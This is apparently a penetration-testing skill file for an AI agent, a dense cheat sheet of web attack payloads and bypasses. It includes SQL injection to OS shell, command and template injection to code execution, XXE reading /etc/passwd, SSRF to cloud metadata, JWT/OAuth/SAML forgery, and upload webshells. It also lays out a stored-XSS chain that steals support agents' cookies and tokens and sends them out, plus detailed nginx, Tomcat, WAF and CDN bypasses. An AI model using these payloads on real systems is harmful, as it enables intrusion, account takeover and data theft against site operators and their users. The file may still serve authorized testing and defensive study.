---
name: web-attack-methods
description: >-
  Web full-stack attacks: SQLi/command injection/SSTI/XSS/SSRF/NoSQL; authentication JWT/OAuth/SAML; LFI/upload; Tomcat/WS/STOMP/XFF/PATH_INFO/CDN502/Wangsu JS challenge bypass. Use when testing Web injection, auth bypass, server-side, WAF/CDN bypass.
metadata:
  tags: [pentesting, penetration-testing, red-team]
---

## Web Attack Methods (Injection / Auth / Server-Side / Misc / CDN)

```
=== Web Injection ===
SQLi: sqlmap -u URL --technique=BEUSTQ --risk=3 --level=5 --os-shell | manual test ' OR 1=1-- / ' AND SLEEP(5)--
  Bypass SEL/**/ECT, case variation, CHAR() | escalate OUTFILE→webshell / xp_cmdshell / UDF
Command injection: ; | && $(cmd) `cmd` %0a | bypass spaces with $IFS, bypass cat with tac/nl | OOB ;nslookup $(whoami).OOB
SSTI: {{7*7}}Jinja2 ${7*7}FreeMarker #{7*7}Ruby | Jinja2 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
XSS: HTML/attribute/JS/href/DOM/SVG | bypass CSP with JSONP/AngularJS CDN | XXE: <!ENTITY xxe SYSTEM "file:///etc/passwd">/"http://OOB/"
🚨 Stored XSS via WebSocket/STOMP chat: customer-service systems (OCS/LiveChat) commonly render visitor messages with innerHTML/v-html in the agent panel (Vue domProps innerHTML)
  Attack chain: visitor STOMP connect → send a message containing <img src=x onerror=fetch(...)> → agent opens the conversation → XSS executes in the agent's browser → steal cookies/token/localStorage
  Key: the agent browser usually has outbound internet access (not limited by the backend air gap)! Payload targets: document.cookie + localStorage + fetch(admin API).then(exfil)
  Bypass: messages with mf:1 (visitor identity) and tp:0 (text type) have their content inserted directly into innerHTML; image messages use the url field (<img src>) and do not go through innerHTML
SSRF: bypass IP with 2130706433/[::1]/nip.io/#@ | cloud metadata 169.254.169.254 | Redis gopher://127.0.0.1:6379/_
NoSQL: {"password":{"$ne":""}} / {"$regex":"^a"}

=== Authentication and Authorization ===
Auth bypass: admin'-- | password reset (predictable token/Host header injection) | MFA bypass (skip/brute-force 4-6 digits) | rotate IPs with X-Forwarded-For
IDOR: swap resource IDs for horizontal privilege escalation | mass assignment {"role":"admin","isAdmin":true}
JWT: jwt_tool -X a (alg none/RS256→HS256) | -C crack weak keys | kid injection | jku/x5u remote key
401/403 bypass: /admin/ /Admin /%2561dmin /admin;/ /admin..;/ | X-Original-URL/X-Rewrite-URL/X-Forwarded-For:127.0.0.1
OAuth/OIDC: redirect_uri manipulation (replacement/suffix/@ confusion/path traversal) | missing state→CSRF | PKCE downgrade | apply all JWT attacks to id_token
SAML: XSW signature wrapping (SAML Raider) | signature stripping | comment truncation admin<!---->@evil | Golden SAML (IdP private key)

=== Server-Side ===
LFI: ../../../etc/passwd | php://filter to read source | data:// expect:// phar:// | RCE chain: log poisoning/session poisoning/phar deserialization
File upload: shell.php.jpg/.PHP/.php./%00 | .htaccess to change parsing | GIF89a magic bytes | ImageMagick/Ghostscript
🚨 Spring Boot Actuator path traversal bypasses the auth interceptor: the interceptor matches /api/* but actuator is allowlisted → /actuator/../api/v1/endpoint bypasses the interceptor and reaches the protected endpoint
  Principle: Spring Security/custom interceptors match paths before normalization, while Tomcat routes after normalization → path traversal bypasses the interceptor but still reaches the target servlet
  Verify: /actuator/health returns 200 (allowlisted) → /actuator/../target also returns 200 (bypass) vs direct /target returns 403/sign is empty (intercepted) | /actuator/health/../../target (template path {*path} traversal)
  sign validation weakness: many custom sign checks only verify that the header is non-empty (sign: any value + expTime: any number passes) → a code:500 instead of "sign is empty" = validation passed | quick check: sign:0 or sign:aaa changing from "sign is empty" to 500 = only non-emptiness is checked
  Escalation: after bypassing, combine with X-HTTP-Method-Override: POST to make a GET request trigger a POST handler (supported by some Spring configurations)

=== Web Misc ===
🚨 Tomcat ..;/ bypasses nginx path restrictions: nginx does not parse ; in the URL (treats it as part of the path) but Tomcat treats ..;/ as path traversal:
  /api/v1/v/..;/admin/path → nginx matches /api/v1/v/ (allows it) → Tomcat parses it as /admin/path (traversal!)
  Verify: normal /admin returns nginx 403; using /api/v1/v/..;/admin returns a Tomcat 404 = bypass successful
  Limitation: Spring MVC DispatcherServlet routing is independent of the filesystem; only static files/non-MVC paths within the same war are reachable
  Combination: pair with a JSP webshell written via Spring4Shell, or access actuator endpoints
🚨 WebSocket/STOMP frames bypass nginx method restrictions: nginx returns 405 for POST /api/v1/a/login, but STOMP frames after a WebSocket upgrade are unrestricted:
  1. GET /api/v1/v/ws/{3-char}/{8-char-random}/websocket → 101 Upgrade (goes through the visitor path bypass)
  2. STOMP CONNECT → STOMP SEND destination:/app/a/login → straight to the Spring backend
  SockJS XHR alternative: POST .../xhr_send sends a STOMP frame (204 = success); no real WebSocket needed
  Pitfall: the CDN disconnects quickly ("Another connection still open"); a raw socket is more stable than a WebSocket library
🚨 X-Forwarded-For bypasses application-layer IP blacklists: the CDN trusts the XFF header, and the application takes the client IP from XFF for blacklist checks:
  Works: X-Forwarded-For: 1.1.1.1 | X-Forwarded-For: 127.0.0.1, 10.0.0.1
  Does not work: X-Real-IP, X-Client-IP, CF-Connecting-IP, True-Client-IP, Forwarded
  Detect: the response contains a JSON blacklist error (`code` 10010 plus a `msg` whose value is the Chinese word for "blacklist") and the data field is your real IP
🚨 PATH_INFO bypasses nginx deny: nginx denies .php files (returns a 146B nginx 404), but PHP-FPM is still reachable via PATH_INFO:
  /denied/file.php → 404|146 (nginx blocks) | /denied/file.php/ → 16B "File not found." (PHP-FPM executes!)
  /denied/file.php/x → same as above. PHP-FPM returning "File not found." means the request penetrated nginx deny and reached PHP-FPM (the script path is just wrong)
  Exploit: if PHP has cgi.fix_pathinfo=1 (default), /uploads/shell.jpg/x.php → PHP executes shell.jpg! | after confirming existence, find the FPM's actual docroot (may differ from nginx)
  Identify: nginx deny returns a fixed size (146B standard 404), PHP-FPM returns 16B "File not found." → the size difference is the breakthrough signal
🚨 Response-size fingerprinting (hidden file discovery): a CMS catch-all route returns a fixed-size homepage (e.g. 44004B); a real nginx 404 returns 146B
  File exists but is denied: returns 146B (nginx 404) | file does not exist: returns the catch-all size (44004B) | → 146B = the file really exists!
  Method: batch-scan paths and classify by response size: catch-all = does not exist, nginx404 = exists but denied, any other size = accessible
WAF bypass decision tree: encoding → protocol level → path → mutation → IP spoofing → smuggling | CORS: Origin reflection + Credentials:true
🚨 CDN 502 bypass (URL pattern filtering): when the CDN returns 502 for admin paths, HTTP encoding/smuggling/method switching are all ineffective → change protocol:
  ① WebSocket upgrade: CDNs usually filter only HTTP responses; WS paths may not be in the filter rules. /api/v1/a/ws/ returns 200 while /api/v1/a/doLogin returns 502 = the WS path is not filtered
  ② Find the origin IP and connect directly: DNS history/certificate transparency/SNI scanning/same-subnet scanning/mail-header Return-Path/Shodan fingerprint matching/CDN origin-config leak/unique error-page fingerprint → bypass the CDN and connect to the backend directly
  ③ Non-standard ports: scan all ports on CDN nodes; some ports may proxy a different backend or apply different filtering rules (e.g. 8085 exposing actuator)
  ④ Path traversal: /api/v1/v/..;/a/doLogin makes Tomcat route to admin while the CDN may not recognize it (note: the CDN may still filter the response)
  ⑤ Wildcard resolution detection: all subdomains resolving to the CDN = wildcard DNS, not real records. Compare results using 114.114.114.114/8.8.8.8
🚨 WSCN/Wangsu CDN JS challenge detection and bypass: the response contains `_jsc_ch_conf` + `ws_sec_page.js` = Wangsu JS challenge (not a WAF block)
  Features: cv:".domain",mt:"jhsq987",chType/chTs/chID/chHash fields | 403 page of 6000+ bytes containing "Embed Iframe"
  Bypass: the CDN skips the challenge only for specific allowlisted paths (e.g. /c/) → use Spring Boot ..;/ traversal (`/c/..;/target_path`) to penetrate to other backend routes
  Identify the backend framework: JSON error `{"timestamp":...,"status":...,"error":...,"path":...}` = Spring Boot | 405 = route exists but method is wrong

=== CDN Bypass (target hidden behind CDN, admin endpoint returns 502) ===
CDN 502 analysis: distinguish URL pattern filtering (fixed timing ~0.3s; every method/encoding/port/node returns 502) vs response-content filtering vs backend down
  Key determination: if path traversal (`/api/v1/v/..;/a/doLogin`) returns a Tomcat 404 = penetrated the CDN to the backend; returns 502 = CDN URL pattern block
  nginx 502 vs CDN PWS 502: nginx = edge-layer reverse proxy is down; PWS = CDN global policy
```
